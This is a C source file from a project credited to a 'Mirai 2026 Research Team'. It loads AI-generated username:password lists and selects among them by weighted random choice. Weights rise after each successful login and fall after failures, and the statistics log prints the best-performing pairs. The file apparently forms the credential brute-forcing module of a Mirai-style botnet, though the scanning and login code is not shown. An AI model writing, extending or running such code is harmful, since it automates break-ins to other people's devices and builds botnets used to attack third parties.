/**
 * @file credential_loader.c
 * @brief Load AI-generated credentials with weighted selection
 * 
 * Integrates with ai/credential_intel/generate.py to:
 * - Load credentials from JSON output
 * - Implement weighted random selection
 * - Track success rates per credential
 * - Update weights based on results
 * 
 * @author Mirai 2026 Research Team
 * @date 2026-02-25
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <json-c/json.h>
#include <pthread.h>

#include "credential_loader.h"
#include "../common/logger.h"
#include "../common/random_secure.h"

typedef struct {
    char username[64];
    char password[64];
    double weight;
    char source[32];
    double confidence;
    
    // Success tracking
    uint32_t attempts;
    uint32_t successes;
    double success_rate;
    time_t last_updated;
} weighted_credential_t;

typedef struct {
    weighted_credential_t *credentials;
    size_t count;
    pthread_mutex_t lock;
    
    // Total weight for weighted random selection
    double total_weight;
} credential_pool_t;

static credential_pool_t g_pool = {0};

/**
 * Load credentials from JSON file generated by AI
 */
int credential_loader_load_from_json(const char *json_file) {
    FILE *fp = fopen(json_file, "r");
    if (!fp) {
        log_error("Failed to open credentials file: %s", json_file);
        return -1;
    }
    
    // Read entire file
    if (fseek(fp, 0, SEEK_END) != 0) {
        log_error("Failed to seek to end of file");
        fclose(fp);
        return -1;
    }
    
    long fsize = ftell(fp);
    if (fsize == -1) {
        log_error("Failed to get file size");
        fclose(fp);
        return -1;
    }
    
    if (fsize > 10 * 1024 * 1024) { // Max 10MB
        log_error("Credential file too large: %ld bytes", fsize);
        fclose(fp);
        return -1;
    }
    
    if (fseek(fp, 0, SEEK_SET) != 0) {
        log_error("Failed to seek to start of file");
        fclose(fp);
        return -1;
    }
    
    char *content = malloc(fsize + 1);
    if (!content) {
        log_error("Failed to allocate memory");
        fclose(fp);
        return -1;
    }
    
    size_t bytes_read = fread(content, 1, fsize, fp);
    if (bytes_read != (size_t)fsize) {
        log_error("Failed to read file: expected %ld, got %zu", fsize, bytes_read);
        free(content);
        fclose(fp);
        return -1;
    }
    
    fclose(fp);
    content[bytes_read] = '\0';
    
    // Parse JSON
    struct json_object *root = json_tokener_parse(content);
    free(content);
    
    if (!root) {
        log_error("Failed to parse JSON credentials file");
        return -1;
    }
    
    // Get credentials array
    struct json_object *creds_array = json_object_object_get(root, "credentials");
    if (!creds_array || !json_object_is_type(creds_array, json_type_array)) {
        log_error("Invalid JSON format: missing 'credentials' array");
        json_object_put(root);
        return -1;
    }
    
    size_t count = json_object_array_length(creds_array);
    
    pthread_mutex_lock(&g_pool.lock);
    
    // Allocate credential pool
    g_pool.credentials = calloc(count, sizeof(weighted_credential_t));
    if (!g_pool.credentials) {
        pthread_mutex_unlock(&g_pool.lock);
        json_object_put(root);
        return -1;
    }
    
    g_pool.count = count;
    g_pool.total_weight = 0.0;
    
    // Load each credential
    for (size_t i = 0; i < count; i++) {
        struct json_object *cred_obj = json_object_array_get_idx(creds_array, i);
        
        struct json_object *username_obj = json_object_object_get(cred_obj, "username");
        struct json_object *password_obj = json_object_object_get(cred_obj, "password");
        struct json_object *weight_obj = json_object_object_get(cred_obj, "weight");
        struct json_object *source_obj = json_object_object_get(cred_obj, "source");
        struct json_object *confidence_obj = json_object_object_get(cred_obj, "confidence");
        
        weighted_credential_t *cred = &g_pool.credentials[i];
        
        strncpy(cred->username, json_object_get_string(username_obj), sizeof(cred->username) - 1);
        strncpy(cred->password, json_object_get_string(password_obj), sizeof(cred->password) - 1);
        
        cred->weight = weight_obj ? json_object_get_double(weight_obj) : 1.0;
        cred->confidence = confidence_obj ? json_object_get_double(confidence_obj) : 0.5;
        
        if (source_obj) {
            strncpy(cred->source, json_object_get_string(source_obj), sizeof(cred->source) - 1);
        } else {
            strcpy(cred->source, "unknown");
        }
        
        cred->attempts = 0;
        cred->successes = 0;
        cred->success_rate = 0.0;
        cred->last_updated = time(NULL);
        
        g_pool.total_weight += cred->weight;
    }
    
    pthread_mutex_unlock(&g_pool.lock);
    
    json_object_put(root);
    
    log_info("Loaded %zu credentials from %s (total_weight=%.2f)", 
             count, json_file, g_pool.total_weight);
    
    return 0;
}

/**
 * Load credentials from simple text file (username:password per line)
 */
int credential_loader_load_from_text(const char *text_file) {
    FILE *fp = fopen(text_file, "r");
    if (!fp) {
        log_error("Failed to open credentials file: %s", text_file);
        return -1;
    }
    
    // Count lines first
    size_t count = 0;
    char line[256];
    while (fgets(line, sizeof(line), fp)) {
        if (line[0] != '#' && line[0] != '\n') {
            count++;
        }
    }
    
    rewind(fp);
    
    pthread_mutex_lock(&g_pool.lock);
    
    g_pool.credentials = calloc(count, sizeof(weighted_credential_t));
    if (!g_pool.credentials) {
        pthread_mutex_unlock(&g_pool.lock);
        fclose(fp);
        return -1;
    }
    
    g_pool.count = 0;
    g_pool.total_weight = 0.0;
    
    // Load credentials
    while (fgets(line, sizeof(line), fp) && g_pool.count < count) {
        // Skip comments and empty lines
        if (line[0] == '#' || line[0] == '\n') {
            continue;
        }
        
        // Parse username:password
        char *colon = strchr(line, ':');
        if (!colon) {
            continue;
        }
        
        *colon = '\0';
        char *username = line;
        char *password = colon + 1;
        
        // Remove trailing newline
        char *newline = strchr(password, '\n');
        if (newline) {
            *newline = '\0';
        }
        
        weighted_credential_t *cred = &g_pool.credentials[g_pool.count];
        
        strncpy(cred->username, username, sizeof(cred->username) - 1);
        strncpy(cred->password, password, sizeof(cred->password) - 1);
        cred->weight = 1.0;  // Equal weight initially
        cred->confidence = 0.5;
        strcpy(cred->source, "manual");
        cred->attempts = 0;
        cred->successes = 0;
        cred->success_rate = 0.0;
        cred->last_updated = time(NULL);
        
        g_pool.total_weight += cred->weight;
        g_pool.count++;
    }
    
    pthread_mutex_unlock(&g_pool.lock);
    
    fclose(fp);
    
    log_info("Loaded %zu credentials from %s", g_pool.count, text_file);
    
    return 0;
}

/**
 * Get credential by weighted random selection
 * 
 * Higher weight = more likely to be selected
 */
credential_t credential_loader_get_weighted(void) {
    credential_t result = {0};
    
    pthread_mutex_lock(&g_pool.lock);
    
    if (g_pool.count == 0 || g_pool.total_weight == 0.0) {
        pthread_mutex_unlock(&g_pool.lock);
        return result;
    }
    
    // Weighted random selection
    double random_val = random_secure_double() * g_pool.total_weight;
    double cumulative_weight = 0.0;
    
    for (size_t i = 0; i < g_pool.count; i++) {
        cumulative_weight += g_pool.credentials[i].weight;
        if (random_val <= cumulative_weight) {
            strncpy(result.username, g_pool.credentials[i].username, sizeof(result.username) - 1);
            strncpy(result.password, g_pool.credentials[i].password, sizeof(result.password) - 1);
            break;
        }
    }
    
    pthread_mutex_unlock(&g_pool.lock);
    
    return result;
}

/**
 * Get credential by index
 */
credential_t credential_loader_get_by_index(size_t index) {
    credential_t result = {0};
    
    pthread_mutex_lock(&g_pool.lock);
    
    if (index < g_pool.count) {
        strncpy(result.username, g_pool.credentials[index].username, sizeof(result.username) - 1);
        strncpy(result.password, g_pool.credentials[index].password, sizeof(result.password) - 1);
    }
    
    pthread_mutex_unlock(&g_pool.lock);
    
    return result;
}

/**
 * Get total credential count
 */
size_t credential_loader_count(void) {
    pthread_mutex_lock(&g_pool.lock);
    size_t count = g_pool.count;
    pthread_mutex_unlock(&g_pool.lock);
    return count;
}

/**
 * Update credential success/failure
 * 
 * Adjusts weight based on success rate
 */
void credential_loader_update_result(const char *username, const char *password, bool success) {
    pthread_mutex_lock(&g_pool.lock);
    
    // Find matching credential
    for (size_t i = 0; i < g_pool.count; i++) {
        weighted_credential_t *cred = &g_pool.credentials[i];
        
        if (strcmp(cred->username, username) == 0 && strcmp(cred->password, password) == 0) {
            cred->attempts++;
            if (success) {
                cred->successes++;
            }
            
            // Calculate success rate
            cred->success_rate = (double)cred->successes / cred->attempts;
            cred->last_updated = time(NULL);
            
            // Adjust weight based on success rate
            // Successful credentials get higher weight
            double old_weight = cred->weight;
            if (success) {
                // Increase weight by 20% on success
                cred->weight = cred->weight * 1.2;
                if (cred->weight > 10.0) {
                    cred->weight = 10.0;  // Cap maximum weight
                }
            } else {
                // Decrease weight by 10% on failure
                cred->weight = cred->weight * 0.9;
                if (cred->weight < 0.1) {
                    cred->weight = 0.1;  // Minimum weight
                }
            }
            
            // Update total weight
            g_pool.total_weight += (cred->weight - old_weight);
            
            log_debug("Updated credential %s:%s - attempts=%u, successes=%u, rate=%.2f%%, weight=%.2f",
                     username, password, cred->attempts, cred->successes, 
                     cred->success_rate * 100, cred->weight);
            
            break;
        }
    }
    
    pthread_mutex_unlock(&g_pool.lock);
}

/**
 * Get statistics for all credentials
 */
void credential_loader_print_stats(void) {
    pthread_mutex_lock(&g_pool.lock);
    
    log_info("=== Credential Statistics ===");
    log_info("Total credentials: %zu", g_pool.count);
    log_info("Total weight: %.2f", g_pool.total_weight);
    
    // Sort by success rate for display
    log_info("\nTop performing credentials:");
    
    for (size_t i = 0; i < g_pool.count && i < 10; i++) {
        weighted_credential_t *cred = &g_pool.credentials[i];
        if (cred->attempts > 0) {
            log_info("  %s:%s - %u/%u (%.1f%%) weight=%.2f source=%s",
                     cred->username, cred->password,
                     cred->successes, cred->attempts,
                     cred->success_rate * 100,
                     cred->weight, cred->source);
        }
    }
    
    pthread_mutex_unlock(&g_pool.lock);
}

/**
 * Initialize credential loader
 */
int credential_loader_init(void) {
    memset(&g_pool, 0, sizeof(g_pool));
    pthread_mutex_init(&g_pool.lock, NULL);
    random_secure_init();
    
    log_info("Credential loader initialized");
    return 0;
}

/**
 * Cleanup credential loader
 */
void credential_loader_cleanup(void) {
    pthread_mutex_lock(&g_pool.lock);
    
    free(g_pool.credentials);
    g_pool.credentials = NULL;
    g_pool.count = 0;
    g_pool.total_weight = 0.0;
    
    pthread_mutex_unlock(&g_pool.lock);
    pthread_mutex_destroy(&g_pool.lock);
    
    log_info("Credential loader cleanup complete");
}
